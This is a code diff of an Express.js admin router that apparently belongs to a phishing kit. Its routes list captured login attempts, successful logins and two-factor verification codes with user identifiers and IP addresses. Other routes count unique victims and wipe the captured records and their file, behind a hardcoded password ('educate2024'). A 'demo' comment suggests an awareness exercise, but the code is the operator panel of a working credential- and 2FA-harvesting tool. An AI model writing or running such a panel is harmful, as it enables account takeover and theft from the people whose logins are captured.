@@ -1,94 +1,88 @@
 const express = require('express');
 const router = express.Router();
 
-// Password for admin access (change this to your preferred password)
-const ADMIN_PASSWORD = 'educate2024';
-
-// Middleware to check admin authentication
-const requireAdminAuth = (req, res, next) => {
+// Simple authentication middleware
+const authenticateAdmin = (req, res, next) => {
   const authHeader = req.headers.authorization;
+  const token = authHeader ? authHeader.replace('Bearer ', '') : null;
   
-  if (!authHeader || !authHeader.startsWith('Bearer ')) {
-    return res.status(401).json({ 
-      success: false, 
-      error: 'Admin authentication required' 
+  // For demo, accept 'educate2024' as password
+  if (token === 'educate2024') {
+    next();
+  } else {
+    res.status(401).json({
+      success: false,
+      message: 'Unauthorized - Invalid admin token'
     });
   }
-
-  const password = authHeader.substring(7); // Remove "Bearer " prefix
-  
-  if (password !== ADMIN_PASSWORD) {
-    return res.status(401).json({ 
-      success: false, 
-      error: 'Invalid admin password' 
-    });
-  }
-
-  next();
 };
 
-// Apply auth middleware to all admin routes
-router.use(requireAdminAuth);
-
-// Admin dashboard - get all captured data
-router.get('/', (req, res) => {
+// Get all captured data
+router.get('/data', authenticateAdmin, (req, res) => {
   try {
-    const data = global.capturedData || [];
-    
+    res.status(200).json({
+      success: true,
+      count: global.capturedData.length,
+      data: global.capturedData
+    });
+  } catch (error) {
+    console.error('Admin data fetch error:', error);
+    res.status(500).json({
+      success: false,
+      message: 'Failed to fetch data'
+    });
+  }
+});
+
+// Get stats
+router.get('/stats', authenticateAdmin, (req, res) => {
+  try {
     const stats = {
-      totalCaptured: data.length,
-      loginAttempts: data.filter(item => item.type === 'LOGIN_ATTEMPT').length,
-      twoFAAttempts: data.filter(item => item.type === '2FA_ATTEMPT').length,
-      successfulLogins: data.filter(item => item.type === 'LOGIN_SUCCESS').length,
-      uniqueIPs: [...new Set(data.map(item => item.ip))].length
+      totalCaptured: global.capturedData.length,
+      loginAttempts: global.capturedData.filter(d => d.type.includes('LOGIN')).length,
+      successfulLogins: global.capturedData.filter(d => d.type === 'LOGIN_SUCCESS').length,
+      verificationAttempts: global.capturedData.filter(d => d.type.includes('VERIFICATION')).length,
+      uniqueUsers: [...new Set(global.capturedData.map(d => d.identifier).filter(Boolean))].length,
+      uniqueIPs: [...new Set(global.capturedData.map(d => d.ip).filter(Boolean))].length,
+      twoFAAttempts: global.capturedData.filter(d => d.type.includes('VERIFICATION')).length
     };
-
-    res.json({
-      success: true,
-      stats: stats,
-      data: data,
-      timestamp: new Date().toISOString()
-    });
-
-  } catch (error) {
-    console.error('Admin data error:', error);
-    res.status(500).json({ success: false, error: 'Internal server error' });
-  }
-});
-
-// Get specific session data
-router.get('/session/:sessionId', (req, res) => {
-  try {
-    const { sessionId } = req.params;
-    const sessionData = global.capturedData.filter(item => item.sessionId === sessionId);
     
-    res.json({
+    res.status(200).json({
       success: true,
-      sessionId: sessionId,
-      data: sessionData
+      stats
     });
-
   } catch (error) {
-    console.error('Session data error:', error);
-    res.status(500).json({ success: false, error: 'Internal server error' });
+    console.error('Stats error:', error);
+    res.status(500).json({
+      success: false,
+      message: 'Failed to calculate stats'
+    });
   }
 });
 
-// Clear all data (for demo reset)
-router.delete('/clear', (req, res) => {
+// Clear all data
+router.delete('/clear', authenticateAdmin, (req, res) => {
   try {
-    const previousCount = global.capturedData.length;
+    const clearedCount = global.capturedData.length;
     global.capturedData = [];
     
-    res.json({
+    // Also clear the file
+    const fs = require('fs');
+    const path = require('path');
+    const dataFile = path.join(__dirname, '../data/capturedData.json');
+    fs.writeFileSync(dataFile, JSON.stringify([], null, 2));
+    
+    res.status(200).json({
       success: true,
-      message: `Cleared ${previousCount} captured items`,
-      clearedCount: previousCount
+      message: 'All data cleared',
+      clearedCount: clearedCount
     });
-
   } catch (error) {
     console.error('Clear data error:', error);
-    res.status(500).json({ success: false, error: 'Internal server error' });
+    res.status(500).json({
+      success: false,
+      message: 'Failed to clear data'
+    });
   }
 });
 
